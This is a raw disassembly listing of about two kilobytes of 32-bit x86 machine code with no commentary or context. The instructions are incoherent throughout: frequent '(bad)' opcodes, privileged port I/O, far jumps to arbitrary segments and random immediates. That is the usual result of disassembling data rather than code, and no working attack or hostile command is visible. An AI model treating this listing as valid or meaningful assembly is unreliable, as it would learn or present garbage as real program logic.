  4157e0:	push   edi
  4157e1:	lahf   
  4157e2:	scas   al,BYTE PTR es:[edi]
  4157e3:	jo     0x41576b
  4157e5:	mov    ch,0xc
  4157e7:	mov    BYTE PTR [esp+eiz*2-0x1eac9952],dl
  4157ee:	rol    BYTE PTR [ecx+0x42],0xa5
  4157f2:	mov    ebx,0xf907c363
  4157f7:	mov    fs,esp
  4157f9:	jg     0x415845
  4157fb:	out    dx,al
  4157fc:	add    al,0x96
  4157fe:	push   eax
  4157ff:	daa    
  415800:	dec    ebx
  415801:	xor    ecx,DWORD PTR cs:[edi+0x5b]
  415805:	mov    bl,0x16
  415807:	or     al,0x8e
  415809:	xchg   ecx,eax
  41580a:	inc    ebp
  41580b:	sbb    bh,BYTE PTR [ecx+ecx*1+0x3d]
  41580f:	jmp    0x41588e
  415811:	call   0x7988cb38
  415816:	popa   
  415817:	mov    WORD PTR [edx+eiz*8-0x262ccdc7],fs
  41581e:	cdq    
  41581f:	pushf  
  415820:	int3   
  415821:	mov    ds:0x92165237,eax
  415826:	lds    esp,FWORD PTR cs:[esi]
  415829:	push   esp
  41582a:	cmc    
  41582b:	jns    0x415844
  41582d:	pop    edx
  41582e:	in     al,dx
  41582f:	xchg   esp,eax
  415830:	in     eax,0xe5
  415832:	cli    
  415833:	jbe    0x4157dc
  415835:	sbb    ecx,DWORD PTR [edx+0x6c]
  415838:	xor    DWORD PTR [ebx-0x3ff16a1f],eax
  41583e:	std    
  41583f:	pop    ecx
  415840:	fdiv   st(7),st
  415842:	pop    ebx
  415843:	out    dx,eax
  415844:	mov    bh,0x4a
  415846:	jnp    0x415889
  415848:	out    0x54,al
  41584a:	mov    bl,bl
  41584c:	xor    esp,DWORD PTR [esi-0x4d]
  41584f:	adc    eax,0x474a1835
  415854:	(bad)  
  415855:	sbb    dh,BYTE PTR [ecx+0x23]
  415858:	mov    ch,0x57
  41585a:	or     DWORD PTR [ebx+0x60],eax
  41585d:	daa    
  41585e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41585f:	mov    ds:0xf3be642,al
  415864:	jne    0x415878
  415866:	mov    eax,ds:0x792e8838
  41586b:	mov    edx,0x21ef62ea
  415870:	nop
  415871:	and    BYTE PTR [edi-0xc],al
  415874:	mov    ebx,0xeda16a00
  415879:	jnp    0x415819
  41587b:	dec    esp
  41587c:	xchg   ebp,eax
  41587d:	imul   eax,DWORD PTR [ebx-0x7c],0x75
  415881:	icebp  
  415882:	icebp  
  415883:	mov    eax,0x972946b9
  415888:	sub    esi,DWORD PTR [ecx-0x3ad30ba7]
  41588e:	or     DWORD PTR [esi],edx
  415890:	cld    
  415891:	push   eax
  415892:	ins    BYTE PTR es:[edi],dx
  415893:	(bad)  
  415894:	imul   eax,eax,0xffffffef
  415897:	setge  BYTE PTR [esi+eiz*1-0x2d0ad352]
  41589f:	add    eax,0x9854e0f2
  4158a4:	out    dx,al
  4158a5:	inc    edx
  4158a6:	cmp    edi,DWORD PTR [ecx-0x355fd5]
  4158ac:	pop    ebx
  4158ad:	cdq    
  4158ae:	jae    0x41592e
  4158b0:	push   0x22f50a0d
  4158b5:	jnp    0x4158d4
  4158b7:	dec    eax
  4158b8:	inc    esp
  4158b9:	mov    BYTE PTR [esp+esi*2],dl
  4158bc:	cmc    
  4158bd:	pop    edx
  4158be:	mov    BYTE PTR [edx+0x38],cl
  4158c1:	push   ebx
  4158c2:	inc    esp
  4158c3:	aas    
  4158c4:	jmp    0x8ba0:0x9b960da5
  4158cb:	mov    eax,0xabe6e025
  4158d0:	sbb    ebp,DWORD PTR [ebp-0x7a1461ee]
  4158d6:	mov    ch,ah
  4158d8:	mov    ah,0x19
  4158da:	sub    dh,BYTE PTR [edi+0x60]
  4158dd:	inc    ebx
  4158de:	(bad)  [si-0x41]
  4158e2:	mov    BYTE PTR [ebp-0x77],ah
  4158e5:	call   0xba9d:0xb78d9e2e
  4158ec:	push   eax
  4158ed:	scas   eax,DWORD PTR es:[edi]
  4158ee:	pop    es
  4158ef:	mov    ebp,0x92bbf997
  4158f4:	jp     0x415925
  4158f6:	jo     0x41594e
  4158f8:	jp     0x415905
  4158fa:	jnp    0x41587e
  4158fc:	jmp    0x7d220bb4
  415901:	mov    bl,0x9e
  415903:	jmp    0x415918
  415905:	xlat   BYTE PTR ds:[ebx]
  415906:	xchg   dh,al
  415908:	pop    eax
  415909:	shr    DWORD PTR [ebx+0xf],1
  41590c:	push   ebp
  41590d:	fild   QWORD PTR es:[ebp-0x1740af36]
  415914:	lds    edx,FWORD PTR [ebx]
  415916:	push   es
  415917:	ins    BYTE PTR es:[edi],dx
  415918:	in     eax,0xd
  41591a:	lods   al,BYTE PTR ds:[esi]
  41591b:	fwait
  41591c:	(bad)  
  41591d:	addr16 adc eax,0x95de7212
  415923:	in     al,0xe2
  415925:	push   eax
  415926:	mov    eax,ds:0xb16fe435
  41592b:	dec    ecx
  41592c:	jmp    0x4158e3
  41592e:	imul   esp,esp,0x37
  415931:	mul    DWORD PTR [ebx+0x18]
  415934:	aam    0x14
  415936:	push   WORD PTR [esi+0x7a8cac3]
  41593d:	mov    ebx,0x8728ed21
  415942:	jae    0x4158d1
  415944:	or     ecx,DWORD PTR [edx-0x2d02ff89]
  41594a:	adc    BYTE PTR [edx-0x3be371f],dh
  415950:	jmp    0x415916
  415952:	lods   eax,DWORD PTR ds:[esi]
  415953:	sbb    ebp,DWORD PTR [ecx+0x64]
  415956:	add    BYTE PTR [esi],dh
  415958:	or     al,0x70
  41595a:	jle    0x415965
  41595c:	adc    eax,0xb05a6075
  415961:	test   esp,edx
  415963:	pop    eax
  415964:	dec    edi
  415965:	xchg   DWORD PTR [edx],esi
  415967:	cmp    BYTE PTR [ebp+0x58c0a019],0x9a
  41596e:	xor    ah,cl
  415970:	hlt    
  415971:	dec    ebp
  415972:	mov    BYTE PTR [edi+0x5b],al
  415975:	push   ds
  415976:	ror    BYTE PTR [ebp+0x25],0x6d
  41597a:	and    edi,ebx
  41597c:	aas    
  41597d:	addr16 xor esp,ecx
  415980:	xor    dl,BYTE PTR [edi]
  415982:	jp     0x415912
  415984:	pop    ebx
  415985:	clc    
  415986:	stos   DWORD PTR es:[edi],eax
  415987:	push   ss
  415988:	mov    ch,0x1b
  41598a:	mov    dl,0x68
  41598c:	xchg   edi,eax
  41598d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41598e:	jl     0x41593f
  415990:	out    dx,al
  415991:	push   ebx
  415992:	ss push esp
  415994:	sbb    esp,DWORD PTR [edx-0x14dab8a9]
  41599a:	xor    eax,0x24420ebe
  41599f:	icebp  
  4159a0:	dec    edx
  4159a1:	xchg   ecx,eax
  4159a2:	push   ds
  4159a3:	fimul  DWORD PTR [edx+0x75]
  4159a6:	repz xor ebx,DWORD PTR [esi-0x62]
  4159aa:	jmp    0x1aa4:0xb3518c2c
  4159b1:	pop    esp
  4159b2:	add    cl,BYTE PTR [ebx+0x4394a109]
  4159b8:	icebp  
  4159b9:	push   0x43f65291
  4159be:	das    
  4159bf:	jno    0x415a2c
  4159c1:	pop    ebx
  4159c2:	pop    esi
  4159c3:	std    
  4159c4:	cmp    cl,bl
  4159c6:	sub    al,0x87
  4159c8:	iret   
  4159c9:	jbe    0x4159bf
  4159cb:	push   es
  4159cc:	clc    
  4159cd:	cmp    ecx,DWORD PTR [ebx+0x31]
  4159d0:	std    
  4159d1:	inc    ecx
  4159d2:	sar    DWORD PTR [ecx-0x4b881da7],1
  4159d8:	ins    BYTE PTR es:[edi],dx
  4159d9:	test   al,0x1
  4159db:	adc    al,BYTE PTR [eax]
  4159dd:	stos   BYTE PTR es:[edi],al
  4159de:	pop    ds
  4159df:	outs   dx,BYTE PTR ds:[esi]
  4159e0:	xchg   ecx,eax
  4159e1:	cmp    al,BYTE PTR [ecx+0x5326601e]
  4159e7:	and    dh,BYTE PTR [edi+eiz*4+0x4c]
  4159eb:	loop   0x41599e
  4159ed:	mov    ah,0xa2
  4159ef:	push   esp
  4159f0:	or     ebp,DWORD PTR ss:[ebp+0x48]
  4159f4:	test   BYTE PTR [eax-0x60016a51],al
  4159fa:	cmp    eax,0x9f751437
  4159ff:	in     eax,0x7c
  415a01:	cmp    dl,BYTE PTR [edi]
  415a03:	fdiv   QWORD PTR [ecx-0x8ff6fae]
  415a09:	fs sti 
  415a0b:	rcr    DWORD PTR [esi-0x23],cl
  415a0e:	xchg   ebx,eax
  415a0f:	sbb    ecx,DWORD PTR [eax-0x52]
  415a12:	and    edi,DWORD PTR [ebx+0xea18b92]
  415a18:	popa   
  415a19:	mov    DWORD PTR [esi+0xc],edx
  415a1c:	pop    esp
  415a1d:	aam    0x3e
  415a1f:	call   0x973d:0x308547a3
  415a26:	mov    ds:0x4eec3aca,eax
  415a2b:	fs mov cs,WORD PTR cs:[eax+0x4c576372]
  415a33:	fwait
  415a34:	aaa    
  415a35:	mov    WORD PTR [ecx-0x60],?
  415a38:	stc    
  415a39:	xchg   BYTE PTR [eax],dh
  415a3b:	mov    edx,0xbf6c03e1
  415a40:	mov    dl,0xf5
  415a42:	add    cl,BYTE PTR [ebx-0x6d043e2f]
  415a48:	jecxz  0x415a17
  415a4a:	adc    esp,esp
  415a4c:	sbb    BYTE PTR ds:0xa9fd437c,bh
  415a52:	adc    bl,BYTE PTR [ecx]
  415a54:	stc    
  415a55:	pushf  
  415a56:	push   edx
  415a57:	mov    al,0xb8
  415a59:	into   
  415a5a:	in     eax,0x75
  415a5c:	test   BYTE PTR [ebx-0x158e31cd],ch
  415a62:	idiv   eax
  415a64:	in     al,dx
  415a65:	or     cl,BYTE PTR [esi+eiz*1-0x7a89b170]
  415a6c:	mov    cl,0xd7
  415a6e:	fisubr WORD PTR [ecx-0x1c]
  415a71:	mov    ebx,0x50738173
  415a76:	jge    0x415ab8
  415a78:	outs   dx,BYTE PTR ss:[si]
  415a7b:	(bad)  
  415a7c:	pop    ebx
  415a7d:	inc    edi
  415a7e:	cld    
  415a7f:	mov    cl,0x1d
  415a81:	push   ebx
  415a82:	push   ebp
  415a83:	mov    edx,0x2a51180f
  415a88:	mov    ebp,DWORD PTR [ecx-0x64]
  415a8b:	scas   al,BYTE PTR es:[edi]
  415a8c:	sbb    edx,DWORD PTR [ebp-0x739d4396]
  415a92:	ins    DWORD PTR es:[edi],dx
  415a93:	retf   0xe373
  415a96:	lods   eax,DWORD PTR ds:[esi]
  415a97:	and    edx,esp
  415a99:	dec    eax
  415a9a:	aad    0x77
  415a9c:	jns    0x415a91
  415a9e:	gs jns 0x415a5c
  415aa1:	jns    0x415a49
  415aa3:	je     0x415aa3
  415aa5:	mov    eax,0xe6563876
  415aaa:	xor    DWORD PTR [ebp+0x36250bf9],esp
  415ab0:	data16 in al,dx
  415ab2:	xor    al,0x21
  415ab4:	outs   dx,BYTE PTR ds:[esi]
  415ab5:	jae    0x415b30
  415ab7:	sbb    BYTE PTR [ecx+0x0],bh
  415aba:	pop    ds
  415abb:	(bad)  
  415abc:	fcom   QWORD PTR [eax]
  415abe:	inc    esp
  415abf:	adc    edx,DWORD PTR [ecx-0x7cf50129]
  415ac5:	ret    0x6f94
  415ac8:	stos   BYTE PTR es:[edi],al
  415ac9:	dec    ebp
  415aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415acb:	push   ss
  415acc:	lods   al,BYTE PTR ds:[esi]
  415acd:	gs inc ebx
  415acf:	ds jo  0x415abd
  415ad2:	dec    esi
  415ad3:	pop    eax
  415ad4:	(bad)  
  415ad5:	push   esp
  415ad6:	or     eax,edx
  415ad8:	pop    es
  415ad9:	dec    eax
  415ada:	push   cs
  415adb:	and    ecx,DWORD PTR [ecx]
  415add:	inc    ecx
  415ade:	dec    ebx
  415adf:	adc    dl,BYTE PTR [ecx-0x2a]
  415ae2:	pop    esp
  415ae3:	xor    al,0xe2
  415ae5:	jne    0x415a7c
  415ae7:	arpl   si,dx
  415ae9:	jno    0x415b66
  415aeb:	popa   
  415aec:	cmc    
  415aed:	push   ecx
  415aee:	push   esp
  415aef:	add    esi,DWORD PTR [ecx-0x56725991]
  415af5:	cmp    eax,0x4b472e66
  415afa:	adc    al,0x87
  415afc:	or     BYTE PTR [ebx-0x3029cb44],ah
  415b02:	mov    bh,0xf2
  415b04:	arpl   WORD PTR [edx],bx
  415b06:	pop    ss
  415b07:	mov    BYTE PTR [ebp+0x3a9264d9],ch
  415b0d:	xchg   BYTE PTR [eax-0x6d],bh
  415b10:	iret   
  415b11:	pop    ebx
  415b12:	sub    dl,ah
  415b14:	out    0x2b,eax
  415b16:	fwait
  415b17:	push   esp
  415b18:	pop    esi
  415b19:	jne    0x415ac7
  415b1b:	out    0xec,eax
  415b1d:	adc    bl,BYTE PTR [esi+0x14]
  415b20:	push   edi
  415b21:	dec    esi
  415b22:	or     al,0xbb
  415b24:	or     BYTE PTR [esi+0x708e6ea3],al
  415b2a:	call   DWORD PTR [edi+0x48]
  415b2d:	loopne 0x415b2e
  415b2f:	mov    dh,0x1f
  415b31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b32:	pop    ebp
  415b33:	inc    eax
  415b34:	dec    esp
  415b35:	fwait
  415b36:	pop    edi
  415b37:	jo     0x415b21
  415b39:	mov    esp,0xd3b2a57b
  415b3e:	pop    edx
  415b3f:	adc    BYTE PTR [edi-0x68],0x68
  415b43:	jp     0x415b93
  415b45:	sbb    BYTE PTR [ebp-0x16],0xe5
  415b49:	adc    al,0x4b
  415b4b:	imul   edx,DWORD PTR [edi+0x44],0x71
  415b4f:	push   edx
  415b50:	or     al,0xc5
  415b52:	jae    0x415ad6
  415b54:	je     0x415b36
  415b56:	cld    
  415b57:	pop    edx
  415b58:	adc    BYTE PTR [ebx+0x37369934],bl
  415b5e:	gs aaa 
  415b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b61:	pop    esi
  415b62:	pop    ecx
  415b63:	cmc    
  415b64:	xchg   esi,eax
  415b65:	mov    BYTE PTR [eax+0x31b08a47],ch
  415b6b:	adc    ah,dl
  415b6d:	sbb    ah,BYTE PTR [eax]
  415b6f:	sub    bl,0xfc
  415b72:	pusha  
  415b73:	aaa    
  415b74:	fwait
  415b75:	js     0x415b27
  415b77:	hlt    
  415b78:	in     al,dx
  415b79:	popa   
  415b7a:	push   ebx
  415b7b:	in     al,0x12
  415b7d:	fs add eax,edx
  415b80:	pop    ecx
  415b81:	test   al,0xeb
  415b83:	adc    al,0x39
  415b85:	(bad)  
  415b86:	adc    al,0x20
  415b88:	sbb    DWORD PTR [ebp+0x4d],esi
  415b8b:	aad    0xd9
  415b8d:	jg     0x415b9d
  415b8f:	sar    DWORD PTR [ebx+0x49b3bf5a],1
  415b95:	push   edi
  415b96:	dec    esi
  415b97:	lods   al,BYTE PTR ds:[esi]
  415b98:	fwait
  415b99:	imul   ebx,DWORD PTR [edi+0x3c],0x68
  415b9d:	xchg   esp,eax
  415b9e:	and    DWORD PTR [edi-0x40aa4a95],esp
  415ba4:	frstor [ebx]
  415ba6:	aas    
  415ba7:	imul   edx,DWORD PTR [ebp+0x1bdd010c],0x91432ed4
  415bb1:	sbb    edi,DWORD PTR [ecx-0x32]
  415bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bb5:	cld    
  415bb6:	retf   0xfae1
  415bb9:	imul   ebp,DWORD PTR [esi+0x4e1d1a59],0x37c885b7
  415bc3:	enter  0xe988,0x7d
  415bc7:	arpl   WORD PTR [esp+eax*8],di
  415bca:	jl     0x415bc1
  415bcc:	popf   
  415bcd:	clc    
  415bce:	lock adc BYTE PTR [eax],bh
  415bd1:	into   
  415bd2:	into   
  415bd3:	push   esi
  415bd4:	fwait
  415bd5:	xchg   DWORD PTR [ebx+0x485de02f],ecx
  415bdb:	push   cs
  415bdc:	retf   0xa8ce
  415bdf:	and    bh,BYTE PTR [edx+eiz*1-0x7b815f71]
  415be6:	(bad)  
  415be7:	xchg   edi,eax
  415be8:	iret   
  415be9:	inc    esp
  415bea:	add    eax,0x194610af
  415bef:	sti    
  415bf0:	test   eax,0x9cc0c976
  415bf5:	or     al,0x4a
  415bf7:	sbb    eax,0xbb061cb9
  415bfc:	pusha  
  415bfd:	xlat   BYTE PTR ds:[ebx]
  415bfe:	cmp    cl,0x88
  415c01:	mov    ah,0x72
  415c03:	sbb    DWORD PTR [esi+0x524abb4a],esp
  415c09:	xchg   BYTE PTR [ebx],dl
  415c0b:	imul   ebx,DWORD PTR ds:0x461a5c3f,0xffffffd4
  415c12:	inc    ebp
  415c13:	and    al,0x4f
  415c15:	das    
  415c16:	add    bl,BYTE PTR [esi]
  415c18:	enter  0x2be6,0xb9
  415c1c:	mov    edx,0x1b784715
  415c21:	(bad)  
  415c22:	inc    BYTE PTR ds:0x527af561
  415c28:	sub    dh,BYTE PTR ds:0x12ed2340
  415c2e:	xlat   BYTE PTR ds:[ebx]
  415c2f:	je     0x415c42
  415c31:	mov    ch,0x9a
  415c33:	les    edi,FWORD PTR [ecx+0x5f3fcbac]
  415c39:	mov    bh,0x25
  415c3b:	addr16 pop ebx
  415c3d:	lahf   
  415c3e:	sub    eax,0xb7629145
  415c43:	adc    ecx,DWORD PTR [edi-0x12]
  415c46:	sub    DWORD PTR [edi+eax*1],edi
  415c49:	(bad)  
  415c4a:	sbb    DWORD PTR [ebx-0x1d],edi
  415c4d:	rep ins BYTE PTR es:[edi],dx
  415c4f:	es (bad) 
  415c51:	push   0xb434929a
  415c56:	inc    edi
  415c57:	jecxz  0x415c8b
  415c59:	sti    
  415c5a:	rol    DWORD PTR [ecx-0x6d7464a1],0xb1
  415c61:	int    0x57
  415c63:	mov    al,0x40
  415c65:	mov    esi,0xd7598426
  415c6a:	in     al,dx
  415c6b:	mov    ah,0x35
  415c6d:	jbe    0x415c10
  415c6f:	call   DWORD PTR [edx-0x61d998d9]
  415c75:	cmp    BYTE PTR [ebx],ah
  415c77:	pusha  
  415c78:	add    edi,DWORD PTR [eax-0x5f28c67]
  415c7e:	je     0x415c44
  415c80:	les    ebp,FWORD PTR [eax-0x5b]
  415c83:	add    ebx,edx
  415c85:	les    eax,FWORD PTR [ebx+0x21]
  415c88:	and    al,0x82
  415c8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8b:	(bad)  
  415c8c:	fisub  DWORD PTR [ebp-0x2d]
  415c8f:	xlat   BYTE PTR ds:[ebx]
  415c90:	add    bl,ah
  415c92:	cdq    
  415c93:	adc    DWORD PTR [esi+esi*4],eax
  415c96:	push   0xafaa9c63
  415c9b:	stos   BYTE PTR es:[edi],al
  415c9c:	dec    eax
  415c9d:	rol    DWORD PTR [bp+si],0x52
  415ca1:	pop    esp
  415ca2:	mov    edi,edx
  415ca4:	pop    esi
  415ca5:	fld    TBYTE PTR [eax]
  415ca7:	inc    edx
  415ca8:	jmp    0x9b17:0xf9bd1910
  415caf:	push   edi
  415cb0:	je     0x415cff
  415cb2:	sbb    DWORD PTR [eax-0x348e5368],0x7b8934e0
  415cbc:	push   ds
  415cbd:	jno    0x415cf1
  415cbf:	loop   0x415c84
  415cc1:	sbb    WORD PTR [eax-0x12],si
  415cc5:	imul   esi,DWORD PTR [edx+0x67],0x3273922a
  415ccc:	lds    edx,FWORD PTR [eax-0x19de2b6b]
  415cd2:	cmp    ecx,DWORD PTR [edi-0x6]
  415cd5:	xchg   ebx,eax
  415cd6:	(bad)  
  415cd7:	in     eax,0xc8
  415cd9:	xchg   BYTE PTR [ebp-0x1e],dl
  415cdc:	into   
  415cdd:	sbb    al,0x60
  415cdf:	dec    ebx
  415ce0:	jbe    0x415c9e
  415ce2:	retf   
  415ce3:	xor    esp,DWORD PTR [edi]
  415ce5:	retf   0xa3d1
  415ce8:	sub    al,0x38
  415cea:	test   al,0x8d
  415cec:	repnz sub dh,ch
  415cef:	add    eax,0xc7ab2eab
  415cf4:	leave  
  415cf5:	dec    ecx
  415cf6:	xor    DWORD PTR fs:[bx+si],esp
  415cfa:	cmp    BYTE PTR [ebp-0x11013df0],0xcb
  415d01:	inc    ebx
  415d02:	repz or eax,0xa1e51216
  415d08:	cwde   
  415d09:	loope  0x415d18
  415d0b:	inc    ebp
  415d0c:	inc    ecx
  415d0d:	pop    eax
  415d0e:	setp   BYTE PTR [ecx+ebx*2-0x3916241d]
  415d16:	jb     0x415cc3
  415d18:	mov    ebp,0x3edc6728
  415d1d:	out    dx,eax
  415d1e:	add    eax,0x1e783cbe
  415d23:	ja     0x415ca8
  415d25:	bound  ecx,QWORD PTR [edx-0x49]
  415d28:	pusha  
  415d29:	pop    ecx
  415d2a:	iret   
  415d2b:	cmp    DWORD PTR [eax],ebp
  415d2d:	daa    
  415d2e:	add    eax,0x61b51fc8
  415d33:	jne    0x415cc5
  415d35:	add    ecx,DWORD PTR [ecx]
  415d37:	out    0x66,al
  415d39:	scas   eax,DWORD PTR es:[edi]
  415d3a:	fist   DWORD PTR [esp+eiz*2-0x243cc364]
  415d41:	rcl    esi,1
  415d43:	push   edx
  415d44:	mov    ah,0x82
  415d46:	inc    esi
  415d47:	push   ebx
  415d48:	test   eax,0xa3132d10
  415d4d:	or     DWORD PTR [ecx],ecx
  415d4f:	jns    0x415d61
  415d51:	sbb    BYTE PTR [esi-0x79],0x7a
  415d55:	rol    esi,cl
  415d57:	sub    BYTE PTR [ebp-0x456c92ee],0xca
  415d5e:	jno    0x415d61
  415d60:	jns    0x415d9f
  415d62:	jmp    0xfa09:0x5fb3c3b9
  415d69:	push   ecx
  415d6a:	adc    eax,0x4c4fdd9b
  415d6f:	lods   al,BYTE PTR ds:[esi]
  415d70:	outs   dx,DWORD PTR ds:[esi]
  415d71:	ficom  DWORD PTR ds:0x85bc7bab
  415d77:	fs add eax,0xffe5987a
  415d7d:	mul    ch
  415d7f:	(bad)  
  415d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d81:	sub    al,0xf1
  415d83:	stc    
  415d84:	mov    ds:0x55864148,al
  415d89:	push   ss
  415d8a:	fadd   DWORD PTR [edx]
  415d8c:	mov    BYTE PTR [edi],cl
  415d8e:	push   eax
  415d8f:	shr    al,0xa6
  415d92:	and    DWORD PTR ds:0x25aacb8b,ebx
  415d98:	fxch   st(1)
  415d9a:	fwait
  415d9b:	sbb    eax,0x39722b0a
  415da0:	aam    0xb6
  415da2:	inc    ebx
  415da3:	std    
  415da4:	scas   al,BYTE PTR es:[edi]
  415da5:	stos   BYTE PTR es:[edi],al
  415da6:	add    al,0xb4
  415da8:	sbb    BYTE PTR [eax-0x6a7b8976],cl
  415dae:	mov    DWORD PTR [ebx],edx
  415db0:	(bad)  
  415db1:	adc    al,0xd5
  415db3:	jmp    0xf72d1ae8
  415db8:	scas   al,BYTE PTR es:[edi]
  415db9:	int3   
  415dba:	and    eax,0x593316e6
  415dbf:	mov    ebp,0x7f5741e0
  415dc4:	mov    DWORD PTR [bp+si],eax
  415dc7:	mov    al,0x5
  415dc9:	iret   
  415dca:	pop    esp
  415dcb:	push   edi
  415dcc:	in     eax,0x17
  415dce:	adc    al,0x88
  415dd0:	cld    
  415dd1:	push   DWORD PTR [ecx]
  415dd3:	mov    al,ds:0x2b375efb
  415dd8:	push   0x9d0060c6
  415ddd:	gs jg  0x415e31
  415de0:	fstp   DWORD PTR [ebx]
  415de2:	or     al,0x9e
  415de4:	add    eax,0xa398247
  415de9:	mov    gs,WORD PTR [edx]
  415deb:	rcl    DWORD PTR [edx+0x7e0aa4e7],cl
  415df1:	mov    cl,0x2c
  415df3:	push   0x94b4c427
  415df8:	je     0x415da5
  415dfa:	mov    ecx,0x5877ba1a
  415dff:	xchg   ch,bh
  415e01:	pop    esi
  415e02:	sub    cl,BYTE PTR [ebp+0x35]
  415e05:	test   BYTE PTR [edi+0x2f],dh
  415e08:	xchg   esi,eax
  415e09:	cmp    DWORD PTR [ebx],ebx
  415e0b:	xor    dh,BYTE PTR [edi+0xaded927]
  415e11:	bound  ecx,QWORD PTR [edi]
  415e13:	xor    al,0x9b
  415e15:	adc    eax,DWORD PTR [ebp+0x77632957]
  415e1b:	stc    
  415e1c:	cwde   
  415e1d:	inc    ebx
  415e1e:	(bad)  
  415e1f:	mov    esi,0xfda03aa5
  415e24:	inc    esp
  415e25:	xor    BYTE PTR [edx+0x7c],cl
  415e28:	push   cs
  415e29:	call   0x56b4af7b
  415e2e:	call   0x4cd8:0x7f44db34
  415e35:	mov    dl,0x5a
  415e37:	mov    ebx,es
  415e39:	and    esp,DWORD PTR [esi+0x37]
  415e3c:	cmp    al,0x70
  415e3e:	sbb    BYTE PTR [esi-0x4f234c02],ch
  415e44:	lahf   
  415e45:	cwde   
  415e46:	mov    bh,0x6b
  415e49:	fsubp  st(0),st
  415e4b:	loopne 0x415e53
  415e4d:	sti    
  415e4e:	lods   eax,DWORD PTR ds:[esi]
  415e4f:	mov    esp,0x2bed9305
  415e54:	call   0xcedfa952
  415e59:	push   ss
  415e5a:	xchg   edi,eax
  415e5b:	add    eax,0xec96a36c
  415e60:	inc    edi
  415e61:	xor    edx,edi
  415e63:	adc    ecx,DWORD PTR [eax+edx*2]
  415e66:	outs   dx,BYTE PTR ds:[esi]
  415e67:	xchg   edx,eax
  415e68:	mov    ds:0xbc820d51,al
  415e6d:	ja     0x415dfa
  415e6f:	jne    0x415e98
  415e71:	and    DWORD PTR [eax-0x69f0ba1c],0x66eed67a
  415e7b:	sub    DWORD PTR [eax-0x5c],esp
  415e7e:	xor    eax,0xb67a7645
  415e83:	scas   eax,DWORD PTR es:[edi]
  415e84:	or     ch,BYTE PTR [ebp-0x34]
  415e87:	repz jmp 0x64183e0
  415e8d:	add    DWORD PTR [ebp-0x55],ebp
  415e90:	cmc    
  415e91:	xor    al,BYTE PTR [ebp+0x3a1da10b]
  415e97:	pusha  
  415e98:	add    al,0xc9
  415e9a:	mov    ecx,0x15fd86af
  415e9f:	fdiv   DWORD PTR [edx+eiz*4-0x7d]
  415ea3:	sub    esp,DWORD PTR [ebx+ebp*4+0x46ebfc00]
  415eaa:	push   cs
  415eab:	in     al,dx
  415eac:	nop
  415ead:	push   0xb79dae45
  415eb2:	loopne 0x415eb9
  415eb4:	lods   eax,DWORD PTR ds:[esi]
  415eb5:	fsubp  st(4),st
  415eb7:	je     0x415ed1
  415eb9:	out    dx,al
  415eba:	out    0x7a,eax
  415ebc:	sbb    ecx,eax
  415ebe:	in     eax,0x8c
  415ec0:	fwait
  415ec1:	ja     0x415e8c
  415ec3:	sahf   
  415ec4:	aad    0xab
  415ec6:	ins    BYTE PTR es:[edi],dx
  415ec7:	mov    WORD PTR [esi-0x6b],fs
  415eca:	imul   ecx,DWORD PTR [edi+ebx*1-0x34eccc3],0xb2583b
  415ed5:	inc    edi
  415ed6:	mov    ebx,?
  415ed8:	fiadd  WORD PTR [esi+ecx*8+0x65]
  415edc:	adc    BYTE PTR [eax+0x18],0x15
  415ee0:	mov    dh,BYTE PTR [ecx+edi*2]
  415ee3:	sub    cl,dh
  415ee5:	or     edi,DWORD PTR [ebp-0x6582de30]
  415eeb:	mov    ecx,0x133887de
  415ef0:	retf   0x49e4
  415ef3:	neg    DWORD PTR [ecx]
  415ef5:	jmp    0x415f2c
  415ef7:	pop    esi
  415ef8:	xor    bl,BYTE PTR [ecx+edx*1+0x5e3e8cf0]
  415eff:	xchg   ecx,eax
  415f00:	icebp  
  415f01:	mov    WORD PTR [eax-0x61267ace],gs
  415f07:	into   
  415f08:	fistp  DWORD PTR [eax-0x4f]
  415f0b:	in     al,0x4
  415f0d:	or     ecx,ecx
  415f0f:	(bad)  
  415f10:	mov    cl,0x57
  415f12:	mov    cs,WORD PTR [eax]
  415f14:	sar    esp,1
  415f16:	hlt    
  415f17:	es jge 0x415f35
  415f1a:	les    edx,FWORD PTR ds:0x75e702ef
  415f20:	and    al,BYTE PTR [eax+0x1b33572e]
  415f26:	psraw  mm1,QWORD PTR [edi+ebx*2-0x329c1b45]
  415f2e:	cmp    eax,0xbb689418
  415f33:	mov    BYTE PTR [esp+ecx*4-0x62],cl
  415f37:	lea    esp,[ebp-0x664acae8]
  415f3d:	add    BYTE PTR [eax-0x18],bl
  415f40:	and    al,0xf7
  415f42:	mov    esi,esi
  415f44:	jnp    0x415f0c
  415f46:	icebp  
  415f47:	(bad)  
  415f49:	loope  0x415f03
  415f4b:	das    
  415f4c:	jecxz  0x415f8c
  415f4e:	sar    DWORD PTR [esi],cl
  415f50:	mov    WORD PTR [edx],ds
  415f52:	jno    0x415f32
  415f54:	sub    BYTE PTR [esi+0x5],cl
  415f57:	mov    ?,WORD PTR [eax-0x4ee9b687]
  415f5d:	test   DWORD PTR [eax-0xdec1b2c],0x9e9d234e
  415f67:	js     0x415f32
  415f69:	call   0x71428590
  415f6e:	sbb    BYTE PTR [ebx],0xa6
  415f71:	jmp    0xaf07d256
  415f76:	push   0x819a7a30
  415f7b:	into   
  415f7c:	ja     0x415f9b
  415f7e:	and    eax,0x534e89d5
  415f83:	pop    ss
  415f84:	adc    al,0xfc
  415f86:	jmp    0x415ff5
  415f88:	xor    cl,ch
  415f8a:	mov    ebx,0x6b3d0ea2
  415f8f:	dec    ecx
  415f90:	cld    
  415f91:	test   DWORD PTR [edx+ebp*1+0x3f],0xc56cc558
  415f99:	retf   0x9488
  415f9c:	xor    DWORD PTR [ebx],edx
  415f9e:	mov    ecx,0x3c9d79a
  415fa3:	sar    BYTE PTR [ebx-0x1ea3aadb],cl
  415fa9:	dec    BYTE PTR [ecx]
  415fab:	sahf   
  415fac:	jl     0x416020
  415fae:	pop    esp
  415faf:	xor    edi,DWORD PTR ds:0x930f3b8
  415fb5:	pcmpeqd mm6,QWORD PTR [ebp-0x501cae75]
